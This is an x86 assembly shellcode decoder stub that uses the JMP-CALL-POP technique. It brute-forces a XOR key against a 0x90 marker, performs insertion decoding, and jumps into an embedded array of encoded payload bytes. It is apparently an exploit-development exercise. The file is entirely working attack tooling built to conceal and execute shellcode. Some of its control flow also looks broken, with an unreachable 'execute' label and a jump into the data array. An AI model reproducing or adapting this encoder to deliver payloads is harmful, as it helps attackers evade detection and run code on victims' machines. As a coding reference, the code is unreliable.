global _start 

section .text

_start:
    ; JMP-CALL-POP
   jmp find_address

decoder:
   ; Get the address of the string into EDI and ESI
   pop edi
   push edi
   pop esi

get_key:
   ; Get the first byte and bruteforce till you get the token 0x90
   mov byte dl, [edi]
   ; Key that will be incremented from 0x00 to 0xFF
   xor ebx,ebx

bruteforce:
   inc ebx
   mov al,dl

   ; Marker for the end of the shellcode
   cmp al,0xAA
   je decode_insertion

   xor al,bl

   cmp al,0x90
   jne bruteforce

   mov al,bl

decode:
   xor byte [edi], al
   inc edi
   xor byte [edi], al
   inc edi
   jmp get_key

decode_insertion:
   lea edi, [esi]
   xor eax, eax
   xor ebx, ebx

insertion_decoder:
   mov bl, byte [esi + eax]
   xor bl, 0x90
   jnz short encoded
   mov bl, byte [esi + eax + 1]
   mov byte [edi], bl
   inc edi
   add al, 2
   jmp short insertion_decoder

execute:
    ; Jump to decoded shellcode
   jmp esi
   
find_address:
   call decoder
   encoded db 0xb7,0xcc,0x3d,0xba,0x0a,0xab,0xf3,0xa3,0x9b,0xbb,0x01,0x95,0x75,0xd4,0xbc,0xf7,0xfa,0xd9,0x1c,0x8d,0xd5,0x1c,0xf7,0x56,0x73,0x31,0xef,0xcd,0xa9,0x34,0x12,0x4f,0x50,0x40,0x71,0xd0,0x94,0xc4,0xf7,0xd7,0x7f,0xee,0x62,0xc3,0x48,0x03,0xd3,0x8e,0x76,0x66,0x2c,0x54,0x0c,0x78,0x05,0x6a,0x37,0x58,0xe4,0x8b,0xdc,0x04,0x3b,0xce,0xb6,0x4a,0xaf,0x53,0x59,0xa6,0xb5,0x05,0xf7,0x30,0x15,0xea,0xeb,0x09,0x9c,0x60,0xe4,0x10,0x7d,0xcc,0x56,0xcc,0xaa